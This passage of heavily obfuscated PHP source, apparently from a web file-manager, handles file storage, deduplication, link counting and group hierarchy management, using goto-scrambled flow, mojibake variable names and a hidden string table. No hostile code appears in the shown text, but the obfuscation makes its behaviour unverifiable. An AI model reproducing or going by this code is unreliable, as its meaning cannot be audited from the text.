str_replace($AÒĞ§ç®˜[8], $AÒĞ§ç®˜[71], KodIO::clear($D¢¡Ü‰š£)); $c‘ä…ˆ¯´ê = $c‘ìÍ™·øß->ext($D¢¡Ü‰š£); goto E‚‘ª”Èº²; E‚‘ª”Èº²: if (!$D¢¡Ü‰š£) { $bÛ¢ô†¼µ = $AÒĞ§ç®˜[1739]; } switch ($bÛ¢ô†¼µ) { case $AÒĞ§ç®˜[1740]: $e³ˆèÃäµ = $e³ˆèÃäµ . $AÒĞ§ç®˜[95] . $c‘ìÍ™·øß->ext($D¢¡Ü‰š£); if ($c‘ä…ˆ¯´ê == $AÒĞ§ç®˜[1679]) { $e³ˆèÃäµ .= $AÒĞ§ç®˜[1428]; } break; case $AÒĞ§ç®˜[1741]: goto CË’ª™ˆ÷; BŒ»ñíÊ¤: if (IO::isTypeObject($e³ˆèÃäµ) && !IO::isUploadServer($e³ˆèÃäµ)) { if (IO::exist($e³ˆèÃäµ)) { return $e³ˆèÃäµ; } $eï”¼È¦ŸÉ = IO::setContent($e³ˆèÃäµ, $AÒĞ§ç®˜[33]); if (!$eï”¼È¦ŸÉ) { show_json($AÒĞ§ç®˜[1744], !1); } } CacheLock::unlock($f÷„†œ•ö³); break; goto F‘ÚÛİ”Òö; bî‹Ú±ÌÀ: CacheLock::lock($f÷„†œ•ö³); $e³ˆèÃäµ = $EÃ¾³ĞŠßÜ . $D¢¡Ü‰š£; if (IO::exist($EÃ¾³ĞŠßÜ . $D¢¡Ü‰š£)) { $D·åÈÒõòŞ = substr($D¢¡Ü‰š£, 0, strlen($D¢¡Ü‰š£) - strlen($c‘ä…ˆ¯´ê)); $D³ïî‘¬Áß = $DÁÄ²È‡¡ ? substr($DÁÄ²È‡¡, 0, 5) : ($E¼…ÉšÇä ? substr($E¼…ÉšÇä, 0, 5) : rand_string(5)); $e³ˆèÃäµ = $EÃ¾³ĞŠßÜ . $D·åÈÒõòŞ . $D³ïî‘¬Áß . $AÒĞ§ç®˜[95] . $c‘ä…ˆ¯´ê; } goto BŒ»ñíÊ¤; CË’ª™ˆ÷: $D“ãËçÁš = Model($AÒĞ§ç®˜[730])->get($AÒĞ§ç®˜[731]); $CÔ¬îÏÕğ = substr(md5($AÒĞ§ç®˜[732] . $D“ãËçÁš . date($AÒĞ§ç®˜[711])), 0, 8); $bİŸ¶™•Ü® = KodIO::defaultDriver(); goto c‘©§¶°ƒ£; c‘©§¶°ƒ£: $EÃ¾³ĞŠßÜ = $AÒĞ§ç®˜[1124] . $bİŸ¶™•Ü®[$AÒĞ§ç®˜[392]] . $AÒĞ§ç®˜[400] . date($AÒĞ§ç®˜[1742]) . $CÔ¬îÏÕğ . $AÒĞ§ç®˜[8]; if ($c‘ä…ˆ¯´ê == $AÒĞ§ç®˜[1679]) { $D¢¡Ü‰š£ .= $AÒĞ§ç®˜[1428]; } $f÷„†œ•ö³ = $AÒĞ§ç®˜[1743] . $EÃ¾³ĞŠßÜ . $D¢¡Ü‰š£; goto bî‹Ú±ÌÀ; F‘ÚÛİ”Òö: case $AÒĞ§ç®˜[1739]: break; default: break; } return $e³ˆèÃäµ; goto AŞùëªäßº; AŞùëªäßº: } public function addFileByRemote($e¦½¹Ø±ˆ, $eå¹Ï¦Ã¿£, $e½Äáƒ‹±ø = array()) { goto A‹µ‰Öö¸; c¿¼ªÀŒâÉ: if ($a­¬ô‰îÎÇ = $this->addFileCheckExist($bƒÆŞŠñ[$C …ää÷[171]], $bƒÆŞŠñ[$C …ää÷[170]], $bƒÆŞŠñ[$C …ää÷[78]])) { return $a­¬ô‰îÎÇ; } return $this->addFileData($bƒÆŞŠñ); goto cø‹ÏŸÄù; A‹µ‰Öö¸: $C …ää÷ =& $_SERVER[´¬]; if (!IO::exist($e¦½¹Ø±ˆ)) { return !1; } $bº²°„Áø« = $e½Äáƒ‹±ø[$C …ää÷[170]] ? $e½Äáƒ‹±ø[$C …ää÷[170]] : $C …ää÷[33]; goto E¾ŸãÙ­Ÿ; E¾ŸãÙ­Ÿ: $A½¿·Şİåà = IO::hashMd5($e¦½¹Ø±ˆ, $bº²°„Áø«); $dØ³’¾³Í‰ = KodIO::defaultDriver(); $bƒÆŞŠñ = array($C …ää÷[547] => IO::size($e¦½¹Ø±ˆ), $C …ää÷[1745] => 1, $C …ää÷[411] => $eå¹Ï¦Ã¿£, $C …ää÷[773] => $dØ³’¾³Í‰[$C …ää÷[392]], $C …ää÷[412] => $e¦½¹Ø±ˆ, $C …ää÷[1746] => $e½Äáƒ‹±ø[$C …ää÷[171]] ? $e½Äáƒ‹±ø[$C …ää÷[171]] : IO::hashSimple($e¦½¹Ø±ˆ), $C …ää÷[1747] => $A½¿·Şİåà ? $A½¿·Şİåà : $bº²°„Áø«); goto c¿¼ªÀŒâÉ; cø‹ÏŸÄù: } private function addFileData($bò‘íéºÍª) { $d…Ğ‘³ç§ =& $_SERVER[´¬]; if (!$bò‘íéºÍª) { return !1; } $bò‘íéºÍª[$d…Ğ‘³ç§[78]] = intval($bò‘íéºÍª[$d…Ğ‘³ç§[78]]); if (!$bò‘íéºÍª[$d…Ğ‘³ç§[78]] && strlen($bò‘íéºÍª[$d…Ğ‘³ç§[171]]) > 32) { $bò‘íéºÍª[$d…Ğ‘³ç§[78]] = intval(substr($bò‘íéºÍª[$d…Ğ‘³ç§[171]], 32)); } $B†’‘ÙÆ¤Ü = $this->add($bò‘íéºÍª); return $this->find($B†’‘ÙÆ¤Ü); } public function addFile($cÀï‡×îÚŸ, $BøÙİ˜¬–‚, $CÇ±ã›ÈÙó = false) { goto fÔ ÙĞ‘ğÖ; CÆ¤…±Ş: return $DŒîØ­¡‹; goto b±É•íŠÇ…; AÀ‚®…Ë: $E½–£•ÑÎ¦ = $_SERVER[´¬][1748] . $A§å˜ìéÜĞ; CacheLock::lock($E½–£•ÑÎ¦); if ($b„²İö¡ = $this->addFileCheckExist($cŠÛÏ²àÆÍ, $A§å˜ìéÜĞ, $c®ºğöŠ½ò)) { CacheLock::unlock($E½–£•ÑÎ¦); return $b„²İö¡; } goto dÛèÒØ’ßÆ; fÔ ÙĞ‘ğÖ: $cŠÛÏ²àÆÍ = IO::hashSimple($cÀï‡×îÚŸ); $A§å˜ìéÜĞ = IO::hashMd5($cÀï‡×îÚŸ); $c®ºğöŠ½ò = IO::size($cÀï‡×îÚŸ); goto AÀ‚®…Ë; dÛèÒØ’ßÆ: $A¡—ƒ¸Ç‹˜ = $this->addFileMake($cÀï‡×îÚŸ, $c®ºğöŠ½ò, $cŠÛÏ²àÆÍ, $A§å˜ìéÜĞ, $BøÙİ˜¬–‚, $CÇ±ã›ÈÙó); $DŒîØ­¡‹ = $this->addFileData($A¡—ƒ¸Ç‹˜); CacheLock::unlock($E½–£•ÑÎ¦); goto CÆ¤…±Ş; b±É•íŠÇ…: } public function addFileMake($Cß° Ï™ë¨, $fù‹ã™•‰, $eŸâ¨È‘º, $d‹ˆÀÈ¤ŒÇ, $Cò§µƒŒÖ´, $b×Ã¯ÜŒØô) { goto e ä›Ü…ĞÔ; e ä›Ü…ĞÔ: $Fêßß„Ğê =& $_SERVER[´¬]; $C‚¿ï†Œõ· = $this->createFileName($Cò§µƒŒÖ´, $eŸâ¨È‘º, $d‹ˆÀÈ¤ŒÇ); $F‰¬Ïˆíî» = get_path_father($C‚¿ï†Œõ·); goto B¼˜÷í„†Î; B¼˜÷í„†Î: $B¼ÙõÓª¤ = get_path_this($C‚¿ï†Œõ·); if ($b×Ã¯ÜŒØô) { $Dé®Œßğóİ = IO::move($Cß° Ï™ë¨, $F‰¬Ïˆíî», !1, $B¼ÙõÓª¤); } else { $Dé®Œßğóİ = IO::copy($Cß° Ï™ë¨, $F‰¬Ïˆíî», !1, $B¼ÙõÓª¤); } if (!$Dé®Œßğóİ) { return !1; } goto bÆ‡èÎ°¯; bÆ‡èÎ°¯: $c…ÂŒÅ©•± = KodIO::defaultDriver(); $aàÑŞ¦«±œ = array($Fêßß„Ğê[547] => $fù‹ã™•‰, $Fêßß„Ğê[1745] => 1, $Fêßß„Ğê[411] => $Cò§µƒŒÖ´, $Fêßß„Ğê[773] => $c…ÂŒÅ©•±[$Fêßß„Ğê[392]], $Fêßß„Ğê[412] => $C‚¿ï†Œõ·, $Fêßß„Ğê[1746] => $eŸâ¨È‘º, $Fêßß„Ğê[1747] => $d‹ˆÀÈ¤ŒÇ); return $aàÑŞ¦«±œ; goto BË‚ìùµ×; BË‚ìùµ×: } public function addFileCheckExist($EğĞÏŒÍø, $a§è²È…îà, $f¯Ìé—Èê×) { $Dê­ˆÕ™Õ× =& $_SERVER[´¬]; $f‡×¿ßÓŒ„ = $this->findByHash($EğĞÏŒÍø, $a§è²È…îà); if (!$f‡×¿ßÓŒ„) { return !1; } $b¤Šõ±­ = array($Dê­ˆÕ™Õ×[1745] => intval($f‡×¿ßÓŒ„[$Dê­ˆÕ™Õ×[1749]]) + 1, $Dê­ˆÕ™Õ×[547] => $f¯Ìé—Èê×); $this->where(array($Dê­ˆÕ™Õ×[446] => $f‡×¿ßÓŒ„[$Dê­ˆÕ™Õ×[445]]))->save($b¤Šõ±­); return $f‡×¿ßÓŒ„; } public function remove($C¨÷­çÅ­) { $this->linkCountChange($C¨÷­çÅ­, !1); $this->clearEmpty(); return !0; } public function linkAdd($E’ì§½Ò…Â) { $this->linkCountChange($E’ì§½Ò…Â, !0); } public function linkCountChange($cğƒ¡ñâ›Ì, $EùĞÊç¢Í) { goto aÈÏäˆ˜; b—ªÁ„ÁÎ: $fÍ¬¤Üğ—É = array(); foreach ($cğƒ¡ñâ›Ì as $eæàÀÈŸ‘·) { $C”Õ”¤ˆ = $eæàÀÈŸ‘· . $c¥°òÕîº[33]; if (!$fÍ¬¤Üğ—É[$C”Õ”¤ˆ]) { $fÍ¬¤Üğ—É[$C”Õ”¤ˆ] = 0; } $fÍ¬¤Üğ—É[$C”Õ”¤ˆ]++; } $cô¸ØÅ·à« = array(); goto A´¬Øºãàî; A´¬Øºãàî: foreach ($fÍ¬¤Üğ—É as $eæàÀÈŸ‘· => $bš–àø´ÂÆ) { $C”Õ”¤ˆ = $bš–àø´ÂÆ . $c¥°òÕîº[33]; if (!$cô¸ØÅ·à«[$C”Õ”¤ˆ]) { $cô¸ØÅ·à«[$C”Õ”¤ˆ] = array(); } $cô¸ØÅ·à«[$C”Õ”¤ˆ][] = $eæàÀÈŸ‘·; } foreach ($cô¸ØÅ·à« as $bš–àø´ÂÆ => $aÈè¥“ÏŒ») { if (!$aÈè¥“ÏŒ») { continue; } $bš–àø´ÂÆ = $EùĞÊç¢Í ? $bš–àø´ÂÆ : -intval($bš–àø´ÂÆ); $d„Îİ—  = array($c¥°òÕîº[445] => array($c¥°òÕîº[7], $aÈè¥“ÏŒ»)); if ($bš–àø´ÂÆ < 0) { $d„Îİ— [$c¥°òÕîº[1749]] = array($c¥°òÕîº[973], abs($bš–àø´ÂÆ)); } $this->where($d„Îİ— )->setAdd($c¥°òÕîº[1749], $bš–àø´ÂÆ); } goto C¨«Š¾ˆº; aÈÏäˆ˜: $c¥°òÕîº =& $_SERVER[´¬]; if (!$cğƒ¡ñâ›Ì) { return; } if (!is_array($cğƒ¡ñâ›Ì)) { $cğƒ¡ñâ›Ì = array($cğƒ¡ñâ›Ì); } goto b—ªÁ„ÁÎ; C¨«Š¾ˆº: } public function findByHash($eòë´Îå—, $E”«÷ŠÅñ = false) { $aƒŞğøÍë =& $_SERVER[´¬]; if (!$eòë´Îå— && !$E”«÷ŠÅñ) { return !1; } $d·ÃÃÖÇ£ = array($aƒŞğøÍë[1746] => $eòë´Îå—); if ($E”«÷ŠÅñ) { $d·ÃÃÖÇ£ = array($aƒŞğøÍë[1747] => $E”«÷ŠÅñ); } return $this->order($aƒŞğøÍë[1750])->where($d·ÃÃÖÇ£)->find(); } public function clearEmpty($Eè¯êÕãŞ« = 0) { goto d±¹¼‚ÙœÕ; d±¹¼‚ÙœÕ: $FÀøÌ‘¡ =& $_SERVER[´¬]; $CÙ½Øè‰ğê = time() - 3600 * 24 * $Eè¯êÕãŞ«; $Dê¯¯ÆâáÈ = $FÀøÌ‘¡[1751] . $CÙ½Øè‰ğê; goto Aò‡™µ¤Ù¦; EË·Ú’¸Œ: foreach ($B•¿µ¡÷ÇØ as $FÆÃ·õä‡‹) { $EÑª îé”->update(1); $this->resetFile($FÆÃ·õä‡‹); } $EÑª îé”->end(); goto FøˆõÛ‘©÷; Aò‡™µ¤Ù¦: $B•¿µ¡÷ÇØ = $this->where($Dê¯¯ÆâáÈ)->select(); if (!$B•¿µ¡÷ÇØ) { return; } $EÑª îé” = new Task($FÀøÌ‘¡[1752], $FÀøÌ‘¡[33], count($B•¿µ¡÷ÇØ)); goto EË·Ú’¸Œ; FøˆõÛ‘©÷: } public function resetFile($F¾ù†ëÕÌã) { goto E‡‰¨´õö; E¸¹á¨òÚ“: $aøÅô»ÎùÆ = Model($e™İëĞ£ğ·[1753])->where($C¬ŸĞêñ)->count(); $bÉ½¦‡Ó² = intval($b·Š‚¾ñÎå) + intval($aøÅô»ÎùÆ); if ($bÉ½¦‡Ó² == 0) { IO::remove($F¾ù†ëÕÌã[$e™İëĞ£ğ·[76]]); Model($e™İëĞ£ğ·[1754])->delete($F¾ù†ëÕÌã[$e™İëĞ£ğ·[445]]); $this->where($C¬ŸĞêñ)->delete(); $this->metaSet($F¾ù†ëÕÌã[$e™İëĞ£ğ·[445]], null, null); return; } goto C²æˆ…¤÷; C²æˆ…¤÷: if ($F¾ù†ëÕÌã[$e™İëĞ£ğ·[1749]] != $bÉ½¦‡Ó²) { $this->where($C¬ŸĞêñ)->save(array($e™İëĞ£ğ·[1745] => $bÉ½¦‡Ó²)); } goto F¦±ÜÇÃÊæ; E‡‰¨´õö: $e™İëĞ£ğ· =& $_SERVER[´¬]; $C¬ŸĞêñ = array($e™İëĞ£ğ·[446] => $F¾ù†ëÕÌã[$e™İëĞ£ğ·[445]]); $b·Š‚¾ñÎå = Model($e™İëĞ£ğ·[1206])->where($C¬ŸĞêñ)->count(); goto E¸¹á¨òÚ“; F¦±ÜÇÃÊæ: } public function storageInfo($aÏØƒó½÷ = false) { goto C‘á¡Ù¸ç; C‘á¡Ù¸ç: $F‹¹öáô‚ =& $_SERVER[´¬]; $bæ»Ñ¦ø = $this->count() + 0.0; $b­ŒËñÜ™ˆ = 0; goto E…ÖÅï²‡; E…ÖÅï²‡: $dÇ¤¢šó‘ƒ = 1; $b™°çÁëÁ = 0; $Cğ™®Šš† = 5000; goto FÍ‘É…ƒ° ; FÍ‘É…ƒ° : for ($E®¬¥È›®… = 0; $E®¬¥È›®… < $bæ»Ñ¦ø; $E®¬¥È›®… = $E®¬¥È›®… + $Cğ™®Šš†) { $C‰è”’©¦ = $this->limit($E®¬¥È›®…, $E®¬¥È›®… + $Cğ™®Šš†)->select(); foreach ($C‰è”’©¦ as $D¥ËÚ­„÷) { $dÇ¤¢šó‘ƒ += $D¥ËÚ­„÷[$F‹¹öáô‚[78]] * $D¥ËÚ­„÷[$F‹¹öáô‚[1749]]; $b­ŒËñÜ™ˆ += $D¥ËÚ­„÷[$F‹¹öáô‚[78]] * ($D¥ËÚ­„÷[$F‹¹öáô‚[1749]] - 1); $b™°çÁëÁ += $D¥ËÚ­„÷[$F‹¹öáô‚[1749]]; } } $f‰ª‰×³Ë‡ = array($F‹¹öáô‚[1755] => $dÇ¤¢šó‘ƒ, $F‹¹öáô‚[1756] => $b­ŒËñÜ™ˆ, $F‹¹öáô‚[1757] => $b­ŒËñÜ™ˆ / $dÇ¤¢šó‘ƒ, $F‹¹öáô‚[82] => $bæ»Ñ¦ø, $F‹¹öáô‚[1758] => $b™°çÁëÁ); return $f‰ª‰×³Ë‡; goto dÒ«Æó½Õ½; dÒ«Æó½Õ½: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\x67\x72\157\x75\x70\x5f\155\145\x74\x61", "\x6d\x65\164\x61\x46\x69\145\154\144" => "\x67\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($d²ÜÓÓØŒ) { $d†¤‚‡õˆ =& $_SERVER[´¬]; return array($d†¤‚‡õˆ[1759] => array($d²ÜÓÓØŒ[0], $d†¤‚‡õˆ[1760]), $d†¤‚‡õˆ[1761] => array($d²ÜÓÓØŒ[0], $d†¤‚‡õˆ[1760])); } protected function getInfo($Añƒ‹Û´›) { $E¾¥âÍˆ­„ = $this->getInfoSimple($Añƒ‹Û´›); if (!$E¾¥âÍˆ­„) { return !1; } return $this->_listDataApplyItem($E¾¥âÍˆ­„); } protected function getInfoSimple($C‡î·¸™¢, $a‘ÅĞö ¯¬ = false) { $F±¨§íİ‚• =& $_SERVER[´¬]; if ($a‘ÅĞö ¯¬) { $dÙëÒƒ¶ø„ = array($F±¨§íİ‚•[1689] => intval($C‡î·¸™¢)); $DòÔ”•ˆ = $this->where($dÙëÒƒ¶ø„)->find(); return is_array($DòÔ”•ˆ) ? $DòÔ”•ˆ : array(); } return $this->cacheFunctionGet($F±¨§íİ‚•[1762], $C‡î·¸™¢); } protected function groupAdd($dÏÅµäÆ››) { goto bÓˆ„ø¾„Á; bÓˆ„ø¾„Á: $fˆÌõÈÎó” =& $_SERVER[´¬]; if (!$dÏÅµäÆ››[$fˆÌõÈÎó”[476]] && isset($dÏÅµäÆ››[$fˆÌõÈÎó”[1689]]) && $dÏÅµäÆ››[$fˆÌõÈÎó”[1689]] == 1) { if ($Ešã¿ ÊöÃ = $this->getInfoSimple($dÏÅµäÆ››[$fˆÌõÈÎó”[1689]], !0)) { return $dÏÅµäÆ››[$fˆÌõÈÎó”[1689]]; } } else { $Ešã¿ ÊöÃ = $this->getInfoSimple($dÏÅµäÆ››[$fˆÌõÈÎó”[476]]); if (!$Ešã¿ ÊöÃ) { return !1; } } $A§¿œ³´òô = $fˆÌõÈÎó”[497]; goto cŒÕ•¼àÅ½; Bæø¦ø‡‚‡: if (isset($dÏÅµäÆ››[$fˆÌõÈÎó”[1765]])) { $this->metaSet($d…×‚¨¿è‚, array($fˆÌõÈÎó”[1765] => $dÏÅµäÆ››[$fˆÌõÈÎó”[1765]], $fˆÌõÈÎó”[1766] => $dÏÅµäÆ››[$fˆÌõÈÎó”[1766]])); unset($dÏÅµäÆ››[$fˆÌõÈÎó”[1765]]); unset($dÏÅµäÆ››[$fˆÌõÈÎó”[1766]]); } Model($fˆÌõÈÎó”[1206])->groupRootAdd($d…×‚¨¿è‚); return $d…×‚¨¿è‚; goto EÖÕ¸ÅáÕ„; EÌ„ô¬ëé”: if (!empty($dÏÅµäÆ››[$fˆÌõÈÎó”[1689]])) { $cĞİ¤³Àç¼[$fˆÌõÈÎó”[1689]] = $dÏÅµäÆ››[$fˆÌõÈÎó”[1689]]; } $d…×‚¨¿è‚ = $this->add($cĞİ¤³Àç¼); $this->setNamePinyin($d…×‚¨¿è‚, $cĞİ¤³Àç¼[$fˆÌõÈÎó”[28]]); goto Bæø¦ø‡‚‡; cŒÕ•¼àÅ½: if ($Ešã¿ ÊöÃ[$fˆÌõÈÎó”[485]]) { $A§¿œ³´òô = $Ešã¿ ÊöÃ[$fˆÌõÈÎó”[485]] . $Ešã¿ ÊöÃ[$fˆÌõÈÎó”[1689]] . $fˆÌõÈÎó”[47]; } $cĞİ¤³Àç¼ = array($fˆÌõÈÎó”[411] => $this->groupNameAuto($dÏÅµäÆ››[$fˆÌõÈÎó”[476]], $dÏÅµäÆ››[$fˆÌõÈÎó”[28]]), $fˆÌõÈÎó”[393] => $dÏÅµäÆ››[$fˆÌõÈÎó”[476]], $fˆÌõÈÎó”[552] => $A§¿œ³´òô, $fˆÌõÈÎó”[1763] => $dÏÅµäÆ››[$fˆÌõÈÎó”[1673]], $fˆÌõÈÎó”[1764] => 0, $fˆÌõÈÎó”[1693] => 0); if (isset($dÏÅµäÆ››[$fˆÌõÈÎó”[1712]])) { $cĞİ¤³Àç¼[$fˆÌõÈÎó”[1712]] = $dÏÅµäÆ››[$fˆÌõÈÎó”[1712]]; } else { $AÑº¼…¥½ù = $this->max($fˆÌõÈÎó”[1712]); if (!$AÑº¼…¥½ù) { $AÑº¼…¥½ù = 0; } $cĞİ¤³Àç¼[$fˆÌõÈÎó”[1712]] = $AÑº¼…¥½ù + 1; } goto EÌ„ô¬ëé”; EÖÕ¸ÅáÕ„: } protected function groupEdit($aŒö¬Ê¢Ğ, $Aï©…ª»ôó) { goto DµÌùÙ¦é­; f‘”ä‹Ô¥: if (isset($Aï©…ª»ôó[$bÚù†àÓâÈ[28]]) && $Aï©…ª»ôó[$bÚù†àÓâÈ[28]] != $b·ĞÛêØ‘ì[$bÚù†àÓâÈ[28]]) { $this->_clearChildrenCache($b·ĞÛêØ‘ì); } return $this->where(array($bÚù†àÓâÈ[1767] => $aŒö¬Ê¢Ğ))->save($Aï©…ª»ôó); goto EéÃ¬ºöºò; DµÌùÙ¦é­: $bÚù†àÓâÈ =& $_SERVER[´¬]; $b·ĞÛêØ‘ì = $this->getInfoSimple($aŒö¬Ê¢Ğ); if (!$b·ĞÛêØ‘ì) { return !1; } goto d©ÜùŒ£çº; d©ÜùŒ£çº: if (!empty($Aï©…ª»ôó[$bÚù†àÓâÈ[476]])) { $B–¡ß¤… = $this->getInfoSimple($Aï©…ª»ôó[$bÚù†àÓâÈ[476]]); if (!$B–¡ß¤…) { return !1; } if ($b·ĞÛêØ‘ì[$bÚù†àÓâÈ[1689]] == $B–¡ß¤…[$bÚù†àÓâÈ[1689]]) { return !1; } if ($Aï©…ª»ôó[$bÚù†àÓâÈ[476]] != $b·ĞÛêØ‘ì[$bÚù†àÓâÈ[476]]) { if ($B–¡ß¤…[$bÚù†àÓâÈ[485]] !== $b·ĞÛêØ‘ì[$bÚù†àÓâÈ[485]] && strpos($B–¡ß¤…[$bÚù†àÓâÈ[485]], $b·ĞÛêØ‘ì[$bÚù†àÓâÈ[485]] . $b·ĞÛêØ‘ì[$bÚù†àÓâÈ[1689]] . $bÚù†àÓâÈ[47]) === 0) { return !1; } $Aï©…ª»ôó[$bÚù†àÓâÈ[552]] = $B–¡ß¤…[$bÚù†àÓâÈ[485]] . $Aï©…ª»ôó[$bÚù†àÓâÈ[476]] . $bÚù†àÓâÈ[47]; $this->_changeChildLevel($b·ĞÛêØ‘ì, $B–¡ß¤…); } } if (isset($Aï©…ª»ôó[$bÚù†àÓâÈ[28]])) { $this->setNamePinyin($aŒö¬Ê¢Ğ, $Aï©…ª»ôó[$bÚù†àÓâÈ[28]]); } if (isset($Aï©…ª»ôó[$bÚù†àÓâÈ[1765]])) { $this->metaSet($aŒö¬Ê¢Ğ, array($bÚù†àÓâÈ[1765] => $Aï©…ª»ôó[$bÚù†àÓâÈ[1765]], $bÚù†àÓâÈ[1766] => $Aï©…ª»ôó[$bÚù†àÓâÈ[1766]])); unset($Aï©…ª»ôó[$bÚù†àÓâÈ[1765]]); unset($Aï©…ª»ôó[$bÚù†àÓâÈ[1766]]); } goto f‘”ä‹Ô¥; EéÃ¬ºöºò: } private function _clearChildrenCache($C®‡é§Ñ×) { $eƒ”·ô¥Ùß =& $_SERVER[´¬]; $E™ÅÎ³ù‘ = array($eƒ”·ô¥Ùß[552] => array($eƒ”·ô¥Ùß[511], $C®‡é§Ñ×[$eƒ”·ô¥Ùß[485]] . $C®‡é§Ñ×[$eƒ”·ô¥Ùß[1689]] . $eƒ”·ô¥Ùß[512])); $c­ªÇˆ·¼é = $this->field($eƒ”·ô¥Ùß[1689])->where($E™ÅÎ³ù‘)->select(); foreach ($c­ªÇˆ·¼é as $A²Š—ù½¦Ï) { $this->cacheFunctionClear($eƒ”·ô¥Ùß[1768], $A²Š—ù½¦Ï[$eƒ”·ô¥Ùß[1689]]); $this->cacheFunctionClear($eƒ”·ô¥Ùß[1762], $A²Š—ù½¦Ï[$eƒ”·ô¥Ùß[1689]]); } } private function _changeChildLevel($E‘â­ë‰, $C‚èäÄ…Ä´, $Dëå«ŞÀÒ = false) { goto béØ¹¯Ä‹‘; c„Á¯Š²™ê: if ($Dëå«ŞÀÒ) { $bÑ™ÕÄèĞ± = $C‚èäÄ…Ä´[$AÃæõ²•½[485]] . $C‚èäÄ…Ä´[$AÃæõ²•½[1689]] . $AÃæõ²•½[47]; } $b«è°Œ‹“Š = array($AÃæõ²•½[552] => array($AÃæõ²•½[511], $E‘â­ë‰[$AÃæõ²•½[485]] . $E‘â­ë‰[$AÃæõ²•½[1689]] . $AÃæõ²•½[512])); $cèŠÉÔ… = array($AÃæõ²•½[552] => array($AÃæõ²•½[560], "\162\x65\160\154\x61\143\x65\x28\160\141\162\145\156\x74\114\x65\x76\145\x6c\54\47{$e¿‚ìçÌœ}\x27\54\x27{$bÑ™ÕÄèĞ±}\x27\51")); goto bƒ¥ë”ï¶É; bƒ¥ë”ï¶É: $this->_clearChildrenCache($E‘â­ë‰); $this->where($b«è°Œ‹“Š)->data($cèŠÉÔ…)->save(); goto C¸è·”´Î–; béØ¹¯Ä‹‘: $AÃæõ²•½ =& $_SERVER[´¬]; $e¿‚ìçÌœ = $E‘â­ë‰[$AÃæõ²•½[485]] . $E‘â­ë‰[$AÃæõ²•½[1689]] . $AÃæõ²•½[47]; $bÑ™ÕÄèĞ± = $C‚èäÄ…Ä´[$AÃæõ²•½[485]] . $C‚èäÄ…Ä´[$AÃæõ²•½[1689]] . $AÃæõ²•½[47] . $E‘â­ë‰[$AÃæõ²•½[1689]] . $AÃæõ²•½[47]; goto c„Á¯Š²™ê; C¸è·”´Î–: } public function setNamePinyin($cäÜ†Í¶¶´, $B²•êÚ•Ôù = false) { $C» çÜ®•Õ =& $_SERVER[´¬]; if (!$B²•êÚ•Ôù) { $eĞĞ±µÇæ = $this->getInfoSimple($cäÜ†Í¶¶´); $B²•êÚ•Ôù = $eĞĞ±µÇæ[$C» çÜ®•Õ[28]]; } if (!Input::check($B²•êÚ•Ôù, $C» çÜ®•Õ[555])) { $this->metaSet($cäÜ†Í¶¶´, $C» çÜ®•Õ[442], null); $this->metaSet($cäÜ†Í¶¶´, $C» çÜ®•Õ[441], null); return; } $dĞŞÈÅö¤ = array($C» çÜ®•Õ[442] => str_replace($C» çÜ®•Õ[50], $C» çÜ®•Õ[33], Pinyin::encode($B²•êÚ•Ôù)), $C» çÜ®•Õ[441] => Pinyin::encode($B²•êÚ•Ôù, $C» çÜ®•Õ[556])); $this->metaSet($cäÜ†Í¶¶´, $dĞŞÈÅö¤); } protected function groupStatus($fÆ²Èèõ„, $Eëå˜êã) { goto bÙ¾Õ—îˆÇ; dÛÕ£ø¬Ù: if ($Eëå˜êã == $c¦‰ËÒ¸±¼[87]) { $fŠ°¢âˆ¶­ = $this->parentLevelArray($c£À¥œùó¹[$c¦‰ËÒ¸±¼[485]]); } else { $AÜšáã¤ê¥ = array($c¦‰ËÒ¸±¼[552] => array($c¦‰ËÒ¸±¼[511], $c£À¥œùó¹[$c¦‰ËÒ¸±¼[485]] . $c£À¥œùó¹[$c¦‰ËÒ¸±¼[1689]] . $c¦‰ËÒ¸±¼[512])); $fŠ°¢âˆ¶­ = $this->where($AÜšáã¤ê¥)->field($c¦‰ËÒ¸±¼[1689])->select(); $fŠ°¢âˆ¶­ = array_to_keyvalue($fŠ°¢âˆ¶­, $c¦‰ËÒ¸±¼[33], $c¦‰ËÒ¸±¼[1689]); } $fŠ°¢âˆ¶­[] = $c£À¥œùó¹[$c¦‰ËÒ¸±¼[1689]]; $Dæšé“Ì‹î = array(); goto d¸®‡ºòê; d¸®‡ºòê: foreach ($fŠ°¢âˆ¶­ as $fÆ²Èèõ„) { $Dæšé“Ì‹î[] = array($c¦‰ËÒ¸±¼[1689] => $fÆ²Èèõ„, $c¦‰ËÒ¸±¼[93] => $c¦‰ËÒ¸±¼[713], $c¦‰ËÒ¸±¼[371] => $Eëå˜êã); } return Model($c¦‰ËÒ¸±¼[1769])->addAll($Dæšé“Ì‹î, array(), !0); goto aâºäš³°; bÙ¾Õ—îˆÇ: $c¦‰ËÒ¸±¼ =& $_SERVER[´¬]; $c£À¥œùó¹ = $this->getInfoSimple($fÆ²Èèõ„); if (!$c£À¥œùó¹) { return !1; } goto dÛÕ£ø¬Ù; aâºäš³°: } protected function groupRemove($a³ÂÃÜĞÑ) { goto c½áÃÅ›†Œ; c½áÃÅ›†Œ: $FˆÌÒáù =& $_SERVER[´¬]; $C£ˆ÷ñ¹“Ô = array($FˆÌÒáù[1689] => $a³ÂÃÜĞÑ); $DËÌÕ¯ø¿ù = $this->where($C£ˆ÷ñ¹“Ô)->find(); goto a„»äÔ¦”; d‡Ğ”‚§é—: $this->where(array($FˆÌÒáù[476] => $a³ÂÃÜĞÑ))->save(array($FˆÌÒáù[476] => $DËÌÕ¯ø¿ù[$FˆÌÒáù[476]])); Model($FˆÌÒáù[1769])->where($C£ˆ÷ñ¹“Ô)->delete(); Model($FˆÌÒáù[1770])->where($C£ˆ÷ñ¹“Ô)->delete(); goto a²ˆÒÎ­é¤; a„»äÔ¦”: if (!$DËÌÕ¯ø¿ù || $DËÌÕ¯ø¿ù[$FˆÌÒáù[476]] == 0) { return !1; } $eÌÃèäğ‰ = $this->getInfoSimple($DËÌÕ¯ø¿ù[$FˆÌÒáù[476]]); $this->_changeChildLevel($DËÌÕ¯ø¿ù, $eÌÃèäğ‰, !0); goto d‡Ğ”‚§é—; a²ˆÒÎ­é¤: Model($FˆÌÒáù[790])->groupRootRemove($a³ÂÃÜĞÑ); return $this->where($C£ˆ÷ñ¹“Ô)->delete(); goto aãÒ¯‘—Ğ’; aãÒ¯‘—Ğ’: } protected function groupSort($AŠÀœ‘‰ÊÔ) { 